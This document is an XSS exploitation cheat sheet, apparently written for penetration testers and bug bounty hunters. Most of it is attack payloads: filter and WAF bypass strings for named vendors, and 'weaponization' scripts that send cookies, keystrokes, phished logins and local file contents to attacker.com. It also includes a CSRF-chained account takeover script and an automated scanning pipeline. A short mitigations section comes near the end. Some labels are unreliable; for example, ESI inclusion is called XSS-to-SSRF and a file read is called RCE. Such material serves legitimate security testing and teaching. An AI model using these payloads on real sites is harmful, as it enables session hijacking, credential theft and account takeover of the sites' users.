## 🎯 Overview & Theory

Cross-Site Scripting (XSS) is a **client-side code injection attack** where malicious scripts are injected into trusted websites. When victims browse the compromised page, their browser executes the attacker's code—bypassing the Same-Origin Policy (SOP) and enabling session hijacking, credential theft, phishing, keylogging, and more.

**Core Impact:**

- **Cookie/Session Theft:** Steal authentication tokens to impersonate victims
- **Credential Harvesting:** Inject fake login forms or keyloggers
- **Phishing & Defacement:** Alter page content to trick users
- **Account Takeover:** Execute actions on behalf of victims
- **Privilege Escalation:** If victim is admin, gain full control

---

## 📚 XSS Types

### 1. **Reflected XSS**

- **Trigger:** User input reflected immediately in HTTP response (e.g., search query, URL parameter)
- **Delivery:** Attacker crafts malicious URL → victim clicks link
- **Scope:** Single-request exploit; requires phishing
- **Example:**
    
    ```
    https://target.com/search?q=<script>alert(1)</script>
    ```
    

### 2. **Stored (Persistent) XSS**

- **Trigger:** Malicious payload saved on server (e.g., comment, profile, forum post)
- **Delivery:** Every user viewing the infected page executes the script
- **Scope:** Most dangerous—no phishing needed; affects multiple users
- **Example:** Inject payload in bio field → all profile visitors compromised

### 3. **DOM-Based XSS**

- **Trigger:** Client-side JavaScript unsafely handles attacker-controlled data (e.g., `location.href`, `innerHTML`)
- **Delivery:** Payload never reaches server; purely client-side
- **Scope:** Harder to detect with traditional scanners
- **Example:**
    
    ```javascript
    document.getElementById("output").innerHTML = location.hash; // #<img src=x onerror=alert(1)>
    ```
    

### 4. **Blind XSS**

- **Trigger:** Payload stored but executed in a different context (e.g., admin panel, log viewer)
- **Delivery:** Inject in contact forms, support tickets, user-agent strings
- **Scope:** Victim is often privileged user (admin); high impact
- **Detection:** Use callback-based payloads (XSS Hunter, Burp Collaborator)

---

## 🔍 Exploitation Methods

### Step 1: Input Discovery

**Identify all user-controlled inputs:**

- URL parameters (`?search=`, `?id=`, `?redirect=`)
- Form fields (search, login, comments, profiles)
- HTTP headers (Referer, User-Agent, Cookie)
- File uploads (filenames, metadata, SVG content)
- WebSocket messages, postMessage events
- Hidden parameters (discover via JS files, source code, Arjun)

**Quick Test Payload:**

```html
'"><svg/onload=alert(1)>
```

If this triggers an alert, the input is vulnerable.

---

### Step 2: Context Analysis

**Determine where your input lands:**

#### **A. Raw HTML Context**

```html
<div>USER_INPUT</div>
```

**Exploit:**

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

#### **B. Inside HTML Attribute**

```html
<input value="USER_INPUT">
```

**Exploit (break out):**

```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
```

**Exploit (no break-out, use events):**

```html
<a href="javascript:alert(1)">Click</a>
<img src=x onerror=alert(1)>
```

#### **C. Inside JavaScript**

```html
<script>var x = 'USER_INPUT';</script>
```

**Exploit:**

```javascript
'; alert(1); //
'; alert(1); var x='
</script><img src=x onerror=alert(1)>
```

#### **D. Inside JavaScript Template Literals**

```javascript
var x = `USER_INPUT`;
```

**Exploit:**

```javascript
${alert(1)}
```

#### **E. Inside Event Handlers**

```html
<div onclick="doSomething('USER_INPUT')">
```

**Exploit:**

```javascript
'); alert(1); //
```

---

### Step 3: Filter Bypass Techniques

#### **A. Case Variation**

```html
<ScRiPt>alert(1)</sCrIpT>
```

#### **B. Encoding**

```html
<!-- HTML Entity Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- Unicode -->
<script>\u0061lert(1)</script>

<!-- Hex -->
<script>eval('\x61lert(1)')</script>

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Double Encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

#### **C. Bypass Tag/Keyword Filters**

```html
<!-- Recursive Filters -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Alternative Tags -->
<svg><animate onbegin=alert(1) attributeName=x>
<details open ontoggle=alert(1)>
<iframe src=javascript:alert(1)>

<!-- Alternative Events -->
<body onload=alert(1)>
<img src=x onmouseover=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- Alternative Keywords -->
confirm(1)
prompt(1)
console.log(1)
```

#### **D. Bypass Parentheses Filters**

```javascript
<script>alert`1`</script>
<img src=x onerror=alert`1`>
<iframe src="javascript:alert`1`">
```

#### **E. Bypass Space Filters**

```html
<svg/onload=alert(1)>
<img%09src=x%09onerror=alert(1)> // Tab (%09)
<svg/**/onload=alert(1)> // Comment
```

#### **F. Bypass Quote Filters**

```javascript
<img src=x onerror=String.fromCharCode(97,108,101,114,116,40,49,41)>
```

---

### Step 4: Weaponization

#### **A. Cookie Theft**

```html
<script>
fetch('https://attacker.com/?c=' + document.cookie);
</script>

<img src=x onerror="location='https://attacker.com/?c='+document.cookie">
```

#### **B. Session Hijacking via XSS → CSRF**

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    var token = this.responseText.match(/csrf-token: (\w+)/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/account/change-email', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('email=attacker@evil.com&csrf=' + token);
};
req.open('GET', '/account', true);
req.send();
</script>
```

#### **C. Keylogging**

```javascript
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
}
</script>
```

#### **D. Phishing (Fake Login Form)**

```html
<script>
document.body.innerHTML = '<form action="https://attacker.com/steal"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><input type="submit" value="Login"></form>';
</script>
```

#### **E. Internal Port Scan**

```javascript
<script>
for(let i=0; i<1000; i++) {
    fetch('http://localhost:' + i, {mode: 'no-cors'})
        .then(() => {
            fetch('https://attacker.com/found?port=' + i);
        });
}
</script>
```

#### **F. Read Local Files (Server-Side XSS in PDF/HTML Render)**

```html
<iframe src="file:///etc/passwd"></iframe>
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function() {
    fetch('https://attacker.com/?data=' + btoa(this.responseText));
};
xhr.open('GET', 'file:///etc/passwd');
xhr.send();
</script>
```

---

## 🎯 Modern Robust Payloads (Top 10)

```html
1. <svg onload=alert(1)>
2. <img src=x onerror=alert(1)>
3. <iframe src=javascript:alert(1)>
4. <details open ontoggle=alert(1)>
5. <body onload=alert(1)>
6. <input autofocus onfocus=alert(1)>
7. <script>alert`1`</script>
8. <svg><animate onbegin=alert(1) attributeName=x>
9. "><svg/onload=alert(1)>
10. javascript:alert(1)
```

**Universal Polyglot (bypasses most filters):**

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

---

## 🛡️ WAF Bypass Techniques

### **Cloudflare**

```html
<svg%0Aonauxclick=0;[1].some(confirm)>
<svg/onload={alert`1`}>
"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;1%26%2300000000000000000041;>
```

### **Akamai**

```html
<SCr%00Ipt>confirm(1)</scR%00ipt>
<img src=x onerror="\u0061lert(1)">
```

### **ModSecurity**

```html
<a href="jav%0A%0Dascript:alert(1)">Click</a>
<iframe src="javascript:'%3Cscript%3Ealert(1)%3C%2Fscript%3E'">
```

### **Imperva Incapsula**

```html
<svg onload\r\n=$.globalEval("alert(1)")>
<input id='a'value='global'><svg+onload=$[a.value+b.value+c.value](d.value)>
```

---

## 📁 XSS in File Uploads

### **SVG File**

```xml
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.domain)</script>
</svg>
```

### **GIF Magic Bytes**

```
GIF89a/*<svg/onload=alert(1)>*/=alert(1)//;
```

### **Filename Injection**

```
"><img src=x onerror=alert(1)>.jpg
```

### **Metadata (Exiftool)**

```bash
exiftool -Artist='"><img src=x onerror=alert(1)>' payload.jpg
```

---

## 🚀 Automation Tools

|Tool|Use Case|Command|
|---|---|---|
|**Dalfox**|Fast XSS scanner|`dalfox url http://target.com`|
|**XSStrike**|Smart fuzzing|`xsstrike -u http://target.com`|
|**Gxss**|Param extraction|`cat urls.txt \| Gxss \| dalfox pipe`|
|**XSS Hunter**|Blind XSS detection|Use hosted payloads|
|**Arjun**|Hidden parameter discovery|`arjun -u http://target.com`|

**Automated Workflow:**

```bash
echo "target.com" | waybackurls | gf xss | Gxss -c 100 | dalfox pipe -b https://your.xss.ht
```

---

## 🔧 Higher Impact Scenarios

### **Self-XSS → Reflected**

If you find self-XSS (e.g., in user settings), escalate by:

1. **Cookie Tossing:** If subdomain vulnerable, inject cookie to trigger XSS on main domain
2. **Session Mirroring:** Admin views your session → XSS triggers
3. **Iframe Trick:** Use `credentialless` iframe to bypass Same-Origin Policy

### **XSS → SSRF**

```html
<esi:include src="http://internal-service/admin"/>
```

### **XSS → RCE (PDF Rendering)**

```html
<iframe src="file:///etc/passwd"></iframe>
<script>
fetch('http://attacker.com/?data=' + btoa(document.body.innerHTML));
</script>
```

### **Postmessage XSS**

```javascript
window.addEventListener('message', function(e) {
    eval(e.data); // Vulnerable
});

// Exploit:
<iframe src="https://target.com"></iframe>
<script>
frames[0].postMessage('alert(1)', '*');
</script>
```

---

## 🛡️ Mitigations

### **1. Input Validation**

- Whitelist allowed characters
- Reject suspicious patterns (`<script>`, `onerror=`, etc.)

### **2. Output Encoding**

- HTML-encode: `<` → `&lt;`, `>` → `&gt;`
- JavaScript-encode: `'` → `\'`, `"` → `\"`
- URL-encode: `<` → `%3C`

### **3. Content Security Policy (CSP)**

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

**Bypass-resistant:**

```http
Content-Security-Policy: default-src 'none'; script-src 'nonce-RANDOM123';
```

### **4. HTTPOnly & Secure Cookies**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### **5. Modern Frameworks**

- Use React, Vue, Angular (auto-escape by default)
- Avoid `.innerHTML`, `eval()`, `document.write()`

### **6. Sanitization Libraries**

- **DOMPurify** (JavaScript)
- **Bleach** (Python)
- **OWASP Java HTML Sanitizer**

---

## 📚 Learning Resources

- **Practice Labs:**
    - [XSS Game (Google)](https://xss-game.appspot.com/)
    - [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- **Payload Collections:**
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
    - [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
- **Cheat Sheets:**
    - [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    - [OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

---

## 🎯 Quick Checklist

- [ ] Identify all input vectors (params, forms, headers, files)
- [ ] Test with basic payload: `'"><svg/onload=alert(1)>`
- [ ] Analyze context (HTML, attribute, JS, event handler)
- [ ] Bypass filters (encoding, case, alternative tags)
- [ ] Weaponize (cookie theft, CSRF, keylogging)
- [ ] Escalate impact (self-XSS → reflected, XSS → SSRF/RCE)
- [ ] Document with PoC and remediation steps

**Pro Tip:** Every dismissed self-XSS could be your next critical! 🚀